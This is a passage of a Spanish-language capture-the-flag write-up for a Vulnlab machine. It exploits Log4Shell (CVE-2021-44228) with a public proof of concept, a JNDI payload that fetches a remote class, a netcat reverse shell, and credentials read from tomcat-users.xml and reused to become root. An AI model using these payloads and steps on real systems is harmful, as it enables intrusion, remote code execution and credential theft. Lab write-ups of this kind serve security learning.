+  File <span class="s2">"/home/miguel/Vulnlab/Feedback/content/log4j-shell-poc/poc.py"</span>, line 144, <span class="k">in</span> &lt;module&gt;
+    main<span class="o">()</span>
+  File <span class="s2">"/home/miguel/Vulnlab/Feedback/content/log4j-shell-poc/poc.py"</span>, line 134, <span class="k">in </span>main
+    <span class="k">if </span>not check_java<span class="o">()</span>:
+           ^^^^^^^^^^^^
+  File <span class="s2">"/home/miguel/Vulnlab/Feedback/content/log4j-shell-poc/poc.py"</span>, line 86, <span class="k">in </span>check_java
+    exit_code <span class="o">=</span> subprocess.call<span class="o">([</span>
+                ^^^^^^^^^^^^^^^^^
+  File <span class="s2">"/usr/lib/python3.11/subprocess.py"</span>, line 389, <span class="k">in </span>call
+    with Popen<span class="o">(</span><span class="k">*</span>popenargs, <span class="k">**</span>kwargs<span class="o">)</span> as p:
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File <span class="s2">"/usr/lib/python3.11/subprocess.py"</span>, line 1026, <span class="k">in </span>__init__
+    self._execute_child<span class="o">(</span>args, executable, preexec_fn, close_fds,
+  File <span class="s2">"/usr/lib/python3.11/subprocess.py"</span>, line 1953, <span class="k">in </span>_execute_child
+    raise child_exception_type<span class="o">(</span>errno_num, err_msg, err_filename<span class="o">)</span>
+FileNotFoundError: <span class="o">[</span>Errno 2] No such file or directory: <span class="s1">'/home/miguel/Vulnlab/Feedback/content/log4j-shell-poc/jdk1.8.0_20/bin/java'</span>
+➜  log4j-shell-poc git:<span class="o">(</span>main<span class="o">)</span> ✗ <span class="nb">ls
+</span>Dockerfile  README.md     poc.py            target
+LICENSE     jdk1.8.0_202  requirements.txt  vulnerable-application
+➜  log4j-shell-poc git:<span class="o">(</span>main<span class="o">)</span> ✗ <span class="nb">mv </span>jdk1.8.0_202 jdk1.8.0_20
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora funciona.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  log4j-shell-poc git:<span class="o">(</span>main<span class="o">)</span> python3 poc.py <span class="nt">--userip</span> 10.8.1.127 <span class="nt">--webport</span> 8000 <span class="nt">--lport</span> 443
+
+<span class="o">[!]</span> CVE: CVE-2021-44228
+<span class="o">[!]</span> Github repo: https://github.com/kozmer/log4j-shell-poc
+
+Picked up _JAVA_OPTIONS: <span class="nt">-Dawt</span>.useSystemAAFontSettings<span class="o">=</span>on <span class="nt">-Dswing</span>.aatext<span class="o">=</span><span class="nb">true</span>
+<span class="o">[</span>+] Exploit java class created success
+<span class="o">[</span>+] Setting up LDAP server
+
+<span class="o">[</span>+] Send me: <span class="k">${</span><span class="nv">jndi</span>:ldap://10.8.1.127:1389/a<span class="k">}</span>
+
+<span class="o">[</span>+] Starting Webserver on port 8000 http://0.0.0.0:8000
+Picked up _JAVA_OPTIONS: <span class="nt">-Dawt</span>.useSystemAAFontSettings<span class="o">=</span>on <span class="nt">-Dswing</span>.aatext<span class="o">=</span><span class="nb">true
+</span>Listening on 0.0.0.0:1389
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Ahora nos dice que ejecutemos lo siguiente <code class="language-plaintext highlighter-rouge">Send me: ${jndi:ldap://10.8.1.127:1389/a}</code>, esta es una URL JNDI (Java Naming and Directory Interface) que apunta a un servidor LDAP.</p>
+  </li>
+  <li>
+    <p>Antes de enviarlo, vamos a convertirlo en <strong>URL-encoded</strong> .</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/tboV7kX.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Ahora lo Copeamos y modificamos la petición que tenemos con <strong>burpsuite</strong>.</p>
+  </li>
+  <li>
+    <p>Si enviamos la petición antes de poner la data, vemos que obtenemos esa respuesta, así que podemos basarnos en obtener algo similar para comprobar que funcione.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/86C57EP.png" />
+</p>
+
+<ul>
+  <li>Ahora en la parte de <strong>name</strong> pondremos todo:</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/C6P8ZHF.png" />
+</p>
+
+<ul>
+  <li>Y enviamos la petición.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/1zE3nfi.png" />
+</p>
+
+<h2 id="shell-as-tomcat">Shell as tomcat</h2>
+
+<ul>
+  <li>Y ahora nos llega la shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  log4j-shell-poc git:<span class="o">(</span>main<span class="o">)</span> ✗ <span class="nb">sudo </span>nc <span class="nt">-nvlp</span> 443
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguel:
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.8.1.127] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.121.97] 47262
+<span class="nb">whoami
+</span>tomcat
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que sí se obtuvo una petición por parte del servidor.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  log4j-shell-poc git:<span class="o">(</span>main<span class="o">)</span> python3 poc.py <span class="nt">--userip</span> 10.8.1.127 <span class="nt">--webport</span> 8000 <span class="nt">--lport</span> 443
+
+<span class="o">[!]</span> CVE: CVE-2021-44228
+<span class="o">[!]</span> Github repo: https://github.com/kozmer/log4j-shell-poc
+
+Picked up _JAVA_OPTIONS: <span class="nt">-Dawt</span>.useSystemAAFontSettings<span class="o">=</span>on <span class="nt">-Dswing</span>.aatext<span class="o">=</span><span class="nb">true</span>
+<span class="o">[</span>+] Exploit java class created success
+<span class="o">[</span>+] Setting up LDAP server
+
+<span class="o">[</span>+] Send me: <span class="k">${</span><span class="nv">jndi</span>:ldap://10.8.1.127:1389/a<span class="k">}</span>
+
+<span class="o">[</span>+] Starting Webserver on port 8000 http://0.0.0.0:8000
+Picked up _JAVA_OPTIONS: <span class="nt">-Dawt</span>.useSystemAAFontSettings<span class="o">=</span>on <span class="nt">-Dswing</span>.aatext<span class="o">=</span><span class="nb">true
+</span>Listening on 0.0.0.0:1389
+Send LDAP reference result <span class="k">for </span>a redirecting to http://10.8.1.127:8000/Exploit.class
+10.10.121.97 - - <span class="o">[</span>23/Mar/2024 11:40:17] <span class="s2">"GET /Exploit.class HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora obtenemos una <strong>bash</strong> interactiva.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("bin/bash")'</span>
+tomcat@ip-10-10-10-7:/<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<ul>
+  <li>Vemos el <strong>pkexec</strong>, pero no lo vamos a explotar.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat@ip-10-10-10-7:/<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'/snap/'</span>
+find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'/snap/'</span>
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/sudo
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/newuidmap
+/bin/ping
+/bin/su
+/bin/fusermount
+/bin/umount
+/bin/mount
+tomcat@ip-10-10-10-7:/<span class="err">$</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que hay un directorio <strong>conf</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat@ip-10-10-10-7:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 156
+drwxr-xr-x 9 root   tomcat  4096 Dec 11  2021 <span class="nb">.</span>
+drwxr-xr-x 4 root   root    4096 Dec 11  2021 ..
+<span class="nt">-rw-r-----</span> 1 root   tomcat 18970 Dec  2  2021 BUILDING.txt
+<span class="nt">-rw-r-----</span> 1 root   tomcat  6210 Dec  2  2021 CONTRIBUTING.md
+<span class="nt">-rw-r-----</span> 1 root   tomcat 57092 Dec  2  2021 LICENSE
+<span class="nt">-rw-r-----</span> 1 root   tomcat  2333 Dec  2  2021 NOTICE
+<span class="nt">-rw-r-----</span> 1 root   tomcat  3378 Dec  2  2021 README.md
+<span class="nt">-rw-r-----</span> 1 root   tomcat  6898 Dec  2  2021 RELEASE-NOTES
+<span class="nt">-rw-r-----</span> 1 root   tomcat 16507 Dec  2  2021 RUNNING.txt
+drwxr-x--- 2 root   tomcat  4096 Dec 11  2021 bin
+drwxr-x--- 2 root   tomcat  4096 Dec 11  2021 conf
+drwxr-x--- 2 root   tomcat  4096 Dec 11  2021 lib
+drwxr-x--- 2 tomcat tomcat  4096 Mar 23 16:32 logs
+drwxr-x--- 2 tomcat tomcat  4096 Mar 23 16:32 temp
+drwxr-x--- 8 tomcat tomcat  4096 Dec 11  2021 webapps
+drwxr-x--- 3 tomcat tomcat  4096 Dec 11  2021 work
+tomcat@ip-10-10-10-7:~<span class="err">$</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno, vemos un archivo interesante que se llama <strong>tomcat-users.xml</strong> con credenciales.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat@ip-10-10-10-7:~/conf<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 240
+drwxr-x--- 2 root tomcat   4096 Dec 11  2021 <span class="nb">.</span>
+drwxr-xr-x 9 root tomcat   4096 Dec 11  2021 ..
+<span class="nt">-rw-r-----</span> 1 root tomcat  12953 Dec  2  2021 catalina.policy
+<span class="nt">-rw-r-----</span> 1 root tomcat   7276 Dec  2  2021 catalina.properties
+<span class="nt">-rw-r-----</span> 1 root tomcat   1400 Dec  2  2021 context.xml
+<span class="nt">-rw-r-----</span> 1 root tomcat   1149 Dec  2  2021 jaspic-providers.xml
+<span class="nt">-rw-r-----</span> 1 root tomcat   2313 Dec  2  2021 jaspic-providers.xsd
+<span class="nt">-rw-r-----</span> 1 root tomcat   4144 Dec  2  2021 logging.properties
+<span class="nt">-rw-r-----</span> 1 root tomcat   7580 Dec  2  2021 server.xml
+<span class="nt">-rw-r-----</span> 1 root tomcat   1226 Dec 11  2021 tomcat-users.xml
+<span class="nt">-rw-r-----</span> 1 root tomcat   2558 Dec  2  2021 tomcat-users.xsd
+<span class="nt">-rw-r-----</span> 1 root tomcat 172359 Dec  2  2021 web.xml
+tomcat@ip-10-10-10-7:~/conf<span class="err">$</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos las credenciales.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat@ip-10-10-10-7:~/conf<span class="nv">$ </span><span class="nb">cat </span>tomcat-users.xml
+<span class="nb">cat </span>tomcat-users.xml
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
+&lt;<span class="o">!</span><span class="nt">--</span>
+  Licensed to the Apache Software Foundation <span class="o">(</span>ASF<span class="o">)</span> under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work <span class="k">for </span>additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  <span class="o">(</span>the <span class="s2">"License"</span><span class="o">)</span><span class="p">;</span> you may not use this file except <span class="k">in </span>compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to <span class="k">in </span>writing, software
+  distributed under the License is distributed on an <span class="s2">"AS IS"</span> BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License <span class="k">for </span>the specific language governing permissions and
+  limitations under the License.
+<span class="nt">--</span><span class="o">&gt;</span>
+&lt;tomcat-users <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://tomcat.apache.org/xml"</span>
+              xmlns:xsi<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span>
+              xsi:schemaLocation<span class="o">=</span><span class="s2">"http://tomcat.apache.org/xml tomcat-users.xsd"</span>
+              <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span><span class="o">&gt;</span>
+  &lt;user <span class="nv">username</span><span class="o">=</span><span class="s2">"admin"</span> <span class="nv">password</span><span class="o">=</span><span class="s2">"H2RR3rGDrbAnPxWa"</span> <span class="nv">roles</span><span class="o">=</span><span class="s2">"manager-gui"</span>/&gt;
+  &lt;user <span class="nv">username</span><span class="o">=</span><span class="s2">"robot"</span> <span class="nv">password</span><span class="o">=</span><span class="s2">"H2RR3rGDrbAnPxWa"</span> <span class="nv">roles</span><span class="o">=</span><span class="s2">"manager-script"</span>/&gt;
+
+&lt;/tomcat-users&gt;
+tomcat@ip-10-10-10-7:~/conf<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="shell-as-root">Shell as root</h2>
+
+<ul>
+  <li>Si las probamos, vemos que prácticamente es la contraseña del usuario <strong>root</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat@ip-10-10-10-7:~/conf<span class="nv">$ </span>su root
+su root
+Password: H2RR3rGDrbAnPxWa
+
+root@ip-10-10-10-7:/opt/tomcat/conf# <span class="nb">whoami
+whoami
+</span>root
+root@ip-10-10-10-7:/opt/tomcat/conf#
+</code></pre></div></div>
+
+<ul>
+  <li>Y allí podemos ver la flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-10-7:~# <span class="nb">cat </span>root.txt
+<span class="nb">cat </span>root.txt
+VL<span class="o">{</span>xd<span class="o">}</span>
+</code></pre></div></div>
+
+<h2 id="extra-info">Extra info</h2>
+
+<ul>
+  <li><a href="https://www.hackplayers.com/2021/12/ce-en-log4j-log4shell-simple-exploit.html">https://www.hackplayers.com/2021/12/ce-en-log4j-log4shell-simple-exploit.html</a></li>
+</ul>
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/gfsxmz3ATBE" frameborder="0" allowfullscreen=""></iframe>
+
+  </div><a class="u-url" href="/vulnlab/machines/2024/03/22/feedback.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
